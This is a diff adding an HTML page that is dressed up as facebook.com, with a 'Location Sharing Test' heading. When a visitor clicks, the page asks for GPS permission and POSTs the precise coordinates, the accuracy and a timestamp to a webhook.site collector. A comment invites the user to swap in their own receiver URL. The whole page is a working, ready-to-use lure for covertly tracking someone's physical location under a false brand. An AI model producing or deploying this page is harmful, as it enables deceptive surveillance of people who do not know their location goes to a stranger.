@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>facebook.com</title>
+</head>
+<body>
+    <h1>📍 Location Sharing Test</h1>
+    <button id="shareBtn" onclick="getLocation()">facebook.com</button>
+    <div id="status" style="margin-top: 20px; font-weight: bold;"></div>
+    <div id="coords" style="margin-top: 10px;"></div>
+
+    <script>
+        // 🔴 IMPORTANT: Replace this with YOUR webhook.site URL or backend endpoint
+        const SERVER_URL = "https://webhook.site/536342b5-7681-47e2-b641-b31301d99e50"; 
+
+        function getLocation() {
+            const statusDiv = document.getElementById('status');
+            const coordsDiv = document.getElementById('coords');
+            const btn = document.getElementById('shareBtn');
+
+            btn.disabled = true;
+            statusDiv.innerHTML = "⏳ Requesting GPS permission...";
+            coordsDiv.innerHTML = "";
+
+            if (!navigator.geolocation) {
+                statusDiv.innerHTML = "❌ Geolocation is not supported.";
+                btn.disabled = false;
+                return;
+            }
+
+            navigator.geolocation.getCurrentPosition(
+                // --- SUCCESS ---
+                function(position) {
+                    const lat = position.coords.latitude;
+                    const lng = position.coords.longitude;
+                    const acc = position.coords.accuracy;
+
+                    // Show the exact coordinates to the user (optional)
+                    coordsDiv.innerHTML = `📍 Latitude: ${lat}<br>📍 Longitude: ${lng}<br>🎯 Accuracy: ±${acc} meters`;
+                    statusDiv.innerHTML = "📤 Sending to server...";
+
+                    // Send the exact location to YOUR receiver
+                    fetch(SERVER_URL, {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify({
+                            latitude: lat,
+                            longitude: lng,
+                            accuracy: acc,
+                            timestamp: new Date().toISOString()
+                        })
+                    })
+                    .then(response => {
+                        if (response.ok) {
+                            statusDiv.innerHTML = "✅ Location sent successfully!";
+                        } else {
+                            statusDiv.innerHTML = "⚠️ Server error, but we got the location.";
+                        }
+                    })
+                    .catch(error => {
+                        statusDiv.innerHTML = "❌ Failed to reach the server. Check your URL.";
+                        console.error(error);
+                    })
+                    .finally(() => {
+                        btn.disabled = false;
+                    });
+                },
+                // --- ERROR ---
+                function(error) {
+                    let msg = "❌ Permission denied or an error occurred.";
+                    if (error.code === 1) msg = "❌ User denied location permission.";
+                    else if (error.code === 2) msg = "❌ GPS signal unavailable.";
+                    else if (error.code === 3) msg = "❌ Location request timed out.";
+                    statusDiv.innerHTML = msg;
+                    btn.disabled = false;
+                }
+            );
+        }
+    </script>
+</body>
+</html>
